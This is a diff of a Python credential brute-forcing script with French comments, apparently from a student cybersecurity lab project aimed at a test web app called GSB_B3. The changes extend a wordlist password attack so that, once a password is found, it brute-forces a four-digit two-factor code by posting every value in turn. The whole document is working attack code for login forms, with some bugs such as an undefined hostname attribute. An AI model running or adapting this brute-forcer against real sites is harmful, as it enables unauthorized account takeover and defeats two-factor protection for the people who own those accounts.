@@ -10,6 +10,7 @@ class Bruteforcer() :
         self.url = url
         self.uri = uri
         self.hyperlink = self.url + self.uri
+        self.session = requests.Session()
 
     # Informe du code HTTP reçu
     def getHTTPCode(self, requete):
@@ -26,7 +27,7 @@ class Bruteforcer() :
     # Session() ajoute de la persistence en cas de réussite
     def authenticate(self):
         continuer = True
-        with requests.Session() as s :
+        with self.session as s :
             # header = self.getHeader()
             while continuer :
                 with open(self.wordlist, 'r') as passwordList:
@@ -41,24 +42,40 @@ class Bruteforcer() :
                         if 'code à 4 chiffres' in requeteHTTP.text :
                             print("\nMot de passe trouvé : " + passwd)
                             continuer = False
-                            self.bruteforce2FA()
-                            break
+                            #self.bruteforce2FA()
+                            for i in range(1000, 9999):
+                                code = {
+                                    'code': i
+                                }
+                                # On teste le code
+                                p = requests.post('http://' + self.hostname + '/index.php?uc=connexion&action=valideA2fConnexion', data=code)
+                                # On essaye de récupérer la page d'accueil
+                                r = requests.get('http://' + self.hostname + '/index.php', data=code)
+                                #elHTML = r.html.find('.glyphicon-home', first=True)
+                                # Est-ce que l'on est connecté ?
+                                print(i)
+                                if 'Afficher mes fiches de frais' in r.text :
+                                    print("Le code est : ",i)
+                                    # On s'arrête lorsque c'est trouvé !
+                                    break
 
     def bruteforce2FA(self) :
-        for i in range(1000, 9999):
-            code = {
-                'code': i
-            }
-            # On teste le code
-            p = s.post('http://GSB_B3/index.php?uc=connexion&action=valideA2fConnexion', data=code)
-            # On essaye de récupérer la page d'accueil
-            r = s.get('http://GSB_B3/index.php', data=code)
-            elHTML = r.html.find('.glyphicon-home', first=True)
-            # Est-ce que l'on est connecté ?
-            if elHTML is not None:
-                print("Le code est : ",i)
-                # On s'arrête lorsque c'est trouvé !
-                break
+        with self.session as s:
+            for i in range(1000, 9999):
+                code = {
+                    'code': i
+                }
+                # On teste le code
+                p = s.post('http://' + self.hostname + '/index.php?uc=connexion&action=valideA2fConnexion', data=code)
+                # On essaye de récupérer la page d'accueil
+                r = s.get('http://' + self.hostname + '/index.php', data=code)
+                #elHTML = r.html.find('.glyphicon-home', first=True)
+                # Est-ce que l'on est connecté ?
+                print(i)
+                if 'glyphicon-home' in r.text :
+                    print("Le code est : ",i)
+                    # On s'arrête lorsque c'est trouvé !
+                    break
 
 
     """
@@ -108,5 +125,5 @@ class Bruteforcer() :
 
 
 
-brute = Bruteforcer('C:/Users/adrien.dodero/Desktop/Cours/Cyber/Lernaen-Hydra/resources/passwords.txt', 'GSB_B3', 'http://GSB_B3', '/index.php?uc=connexion&action=valideConnexion')
+brute = Bruteforcer('C:/Users/adrien.dodero/Desktop/Cours/Cyber/Lernaen-Hydra/resources/passwords.txt', 'gsb-b3', 'http://gsb-b3', '/index.php?uc=connexion&action=valideConnexion')
 brute.authenticate()
